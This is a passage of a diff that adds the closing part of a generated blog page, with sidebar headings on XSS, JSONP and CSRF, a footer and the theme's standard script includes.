href="#XSS："><span class="nav-number">1.7.1.</span> <span class="nav-text">XSS：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JSONP"><span class="nav-number">1.7.2.</span> <span class="nav-text">JSONP:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CSRF："><span class="nav-number">1.7.3.</span> <span class="nav-text">CSRF：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">13.1k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
